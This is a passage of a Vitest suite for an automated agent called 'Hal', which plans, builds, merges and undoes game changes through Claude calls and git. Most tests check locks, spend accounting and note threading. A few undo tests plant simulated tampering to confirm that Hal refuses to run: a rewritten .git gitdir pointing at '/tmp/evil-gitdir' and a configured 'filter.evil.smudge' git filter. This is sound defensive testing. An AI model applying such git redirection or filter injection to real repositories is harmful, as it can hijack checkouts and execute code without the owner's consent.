    const claude = vi.fn();
    expect(await runNight(opts(), deps({ claude }))).toBe(1);
    expect(claude).not.toHaveBeenCalled();
    expect(readReport().warnings.join('\n')).toMatch(/filter\.evil\.smudge/);
    expect(existsSync(join(halDir, 'wt', 'main'))).toBe(false);
    expect(await undoCommand('HAL-001', 'r', { push: false }, deps())).toBe(1);
    expect(logs.join('\n')).toMatch(/refusing to run git/);
  });
  it('undo: a test step that rewrites the worktree .git is caught; .git is restored before any git call; nothing moves', async () => {
    await makePass();
    const head = halHead();
    const dotGit = join(halDir, 'wt', 'main', '.git');
    const before = readFileSync(dotGit, 'utf8');
    const evil = node(`require('fs').writeFileSync('.git', 'gitdir: /tmp/evil-gitdir\\n')`);
    expect(await undoCommand('HAL-001', 'r', { push: false }, deps({ undoTest: () => [evil] }))).toBe(1);
    expect(readFileSync(dotGit, 'utf8')).toBe(before);
    expect(halHead()).toBe(head);
    expect(gitIn(join(halDir, 'wt', 'main'), 'status', '--porcelain')).toBe('');
    expect(feedback().undos[0]!.error).toMatch(/\.git changed/);
  });
  it('undo: a filter configured during the tests (worktree config) makes Hal leave the tree alone', async () => {
    await makePass();
    const head = halHead();
    const step = node(`require('child_process').execFileSync('git', ['config', 'filter.evil.smudge', 'false'])`);
    expect(await undoCommand('HAL-001', 'r', { push: false }, deps({ undoTest: () => [step] }))).toBe(1);
    expect(halHead()).toBe(head);
    expect(feedback().undos[0]!.error).toMatch(/filter\.evil\.smudge.*left as it is/);
  });
  it('lock: a live pid that started after the lock was taken is a reused pid: the lock is taken over', async () => {
    put(halDir, 'run.lock', J({ pid: process.pid, runId: 'ancient', startedAt: '2000-01-01T00:00:00.000Z' }));
    expect(await runNight(opts({ reportOnly: true }), deps({ startTimeOf: () => new Date() }))).toBe(0);
    put(halDir, 'run.lock', J({ pid: process.pid, runId: 'unknown-start', startedAt: '2000-01-01T00:00:00.000Z' }));
    expect(await runNight(opts({ reportOnly: true }), deps({ startTimeOf: () => null }))).toBe(2); // start unknown: alive
  });
  it('killLiveGroups (called by the signal guard) kills a running isolated check\'s process group', async () => {
    const t0 = Date.now();
    const p = runIsolated(['sleep', '30'], { cwd: repo, env: { PATH: process.env.PATH }, timeoutMs: 60_000, unsandboxed: true });
    await new Promise((r) => setTimeout(r, 100));
    killLiveGroups();
    const r = await p;
    expect(r.code).not.toBe(0);
    expect(Date.now() - t0).toBeLessThan(5_000);
  });
  it('defaultStartTime reads ps lstart (null where ps is unavailable, e.g. inside a sandbox)', () => {
    const t = defaultStartTime(process.pid);
    if (process.env.HAL_SANDBOXED === '1' && t === null) return;
    expect(t).toBeInstanceOf(Date);
    expect(t!.getTime()).toBeLessThanOrEqual(Date.now());
    expect(lockLive({ pid: process.pid, runId: 'x', startedAt: '2000-01-01T00:00:00.000Z' })).toBe(false);
    expect(lockLive({ pid: process.pid, runId: 'x', startedAt: new Date().toISOString() })).toBe(true);
  });
  it('R19: a call reserved at 23:59 and settled at 00:01 is settled in its own day, booked once', async () => {
    const late = new Date(2026, 10, 11, 23, 59), early = new Date(2026, 10, 12, 0, 1);
    let clock = late;
    const claude: RunDeps['claude'] = async (call) => {
      calls.push(call);
      if (call.role === 'planner') { clock = early; return ok(J({ tickets: [] }), 0.4); }
      return ok(J({ note: 'n', perGame: {}, noteReplies: [] }), 0.1);
    };
    await runNight(opts({ reportOnly: true }), deps({ claude, now: () => clock }));
    const days = JSON.parse(read(halDir, 'spend.json')) as SpendDay[];
    const by = (d: Date) => days.find((x) => x.day === dayOf(d))?.calls.map((c) => [c.role, c.usd, c.pending ?? false]);
    expect(by(late)).toEqual([['planner', 0.4, false]]);
    expect(by(early)).toEqual([['director', 0.1, false]]);
    expect(readReport().spend.api).toBe(0.5);
  });
  it('R19: each reservation carries its own id and is settled by it', async () => {
    seedSpend(0);
    await runNight(opts(), deps());
    const ids = spendCalls().map((c) => (c as { id?: string }).id);
    expect(ids.every((x) => typeof x === 'string')).toBe(true);
    expect(new Set(ids).size).toBe(ids.length);
    expect(spendCalls().some((c) => c.pending)).toBe(false);
  }, 60_000);
  it('an undo of a pass that was never merged is recorded as rejected (not retried)', async () => {
    expect(await undoCommand('HAL-404', 'nope', { push: false }, deps())).toBe(1);
    expect(feedback().undos).toEqual([expect.objectContaining({ pass: 'HAL-404', status: 'rejected' })]);
  });
});

describe('final review fixes', () => {
  it('notes stay: a note the director marked queued in run 1 is in run 2\'s planner and director prompts, with its status and reply', async () => {
    put(halDir, 'notes.json', J([
      { id: 'N-001', at: NOW.toISOString(), game: null, text: 'more neon please', status: 'open' },
      { id: 'N-002', at: NOW.toISOString(), game: 'tidepool-pals', text: 'not in scope', status: 'open' },
    ]));
    const director = { note: 'n', perGame: {}, noteReplies: [{ id: 'N-001', status: 'queued', reply: 'Neon is next week.' }] };
    await runNight(opts({ reportOnly: true }), deps({ claude: fakeClaude({ tickets: [], director }) }));
    expect(JSON.parse(read(halDir, 'notes.json'))[0]).toMatchObject({ id: 'N-001', status: 'queued', reply: 'Neon is next week.' });
    calls = [];
    await runNight(opts({ reportOnly: true }), deps({ claude: fakeClaude({ tickets: [] }) }));
    const [planner, dir] = [calls.find((c) => c.role === 'planner')!, calls.find((c) => c.role === 'director')!];
    for (const p of [planner.prompt, dir.prompt]) {
      expect(p).toContain('more neon please');
      expect(p).toContain('"status": "queued"');
      expect(p).toMatch(/"from": "Hal",[\s\S]*"text": "Neon is next week."/); // the thread, Hal's reply in it
      expect(p).not.toContain('not in scope'); // another game's note stays out of a hyperline-only run
    }
  }, 60_000);

  it('one bad planner ticket is a warning; the good ones are still built', async () => {
    const bad = T('TX', 'Ship to pong', { game: 'pong' });
    expect(await runNight(opts(), deps({ claude: fakeClaude({ tickets: [bad, GOOD] }) }))).toBe(0);
    const r = readReport();
    expect(r.changes.map((c) => [c.ticket.id, c.verdict])).toEqual([['T1', 'merged']]);
    expect(r.warnings.join('\n')).toMatch(/planner ticket 1 \(TX: Ship to pong\) was rejected: unknown game pong/);
  }, 60_000);

  it('pass ids continue after the highest Hal-Pass on refs/hal/main, even with a fresh .data/hal', async () => {
    await ensureMainWorktree(repo);
    const tree = gitIn(repo, 'rev-parse', `${HAL_MAIN}^{tree}`);
    const trailers = formatTrailers({ pass: 'HAL-003', game: 'hyperline', kind: 'fix', why: 'w', scoreBefore: 1, scoreAfter: 2, version: '0.3.1', run: 'run-old' });
    const c = execFileSync('git', ['commit-tree', tree, '-p', halHead(), '-m', `fix(hyperline): old\n\nw\n\n${trailers}`], { cwd: repo, encoding: 'utf8' }).trim();
    gitIn(repo, 'update-ref', HAL_MAIN, c);
    gitIn(repo, 'push', '-q', 'origin', `${c}:refs/heads/main`); // pushed: not diverged
    expect(existsSync(join(halDir, 'ledger.json'))).toBe(false);
    expect(await runNight(opts(), deps())).toBe(0);
    const r = readReport();
    expect(r.changes.map((x) => x.pass)).toEqual(['HAL-004']);
    expect(JSON.parse(read(halDir, 'ledger.json')).passes.map((p: { id: string }) => p.id)).toEqual(['HAL-004']);
    expect(parseTrailers(gitIn(repo, 'log', '-1', '--format=%B', `${HAL_MAIN}^`))?.pass).toBe('HAL-004');
  }, 60_000);

  it('R24: appendSystemPromptFile reaches every role (planner, implementer, director)', async () => {
    const md = join(repo, 'CLAUDE.md');
    await runNight(opts(), deps({ appendSystemPromptFile: md }));
    expect(calls.map((c) => c.role)).toEqual(['planner', 'implementer', 'director']);
    for (const c of calls) expect(c.appendSystemPromptFile, c.role).toBe(md);
  }, 60_000);

  it('R24: realRunDeps points appendSystemPromptFile at <repo>/CLAUDE.md when it exists', () => {
    expect(realRunDeps(repo, halDir).appendSystemPromptFile).toBeUndefined();
    put(repo, 'CLAUDE.md', '# rules\n');
    expect(realRunDeps(repo, halDir).appendSystemPromptFile).toBe(join(repo, 'CLAUDE.md'));
  });

  it('R21: the director\'s $1 is held through the builds: tight money skips a build rather than the note', async () => {
    seedSpend(15); // 4.50 to slice: planner 1.50, then 3.00 - 1.00 held = 2.00 for the one implementer, director 1.00
    await runNight(opts(), deps({ claude: fakeClaude({ tickets: [GOOD, THIRD], costs: { planner: 1.5, 'Smoother jumps': null, director: null } }) }));
    expect(calls.map((c) => [c.role, c.maxBudgetUsd])).toEqual([['planner', 1.5], ['implementer', 2], ['director', 1]]);
    expect(readReport().changes.map((c) => c.verdict)).toEqual(['merged', 'skipped']);
    expect(readReport().spend.api).toBe(4.5);
  }, 60_000);
});
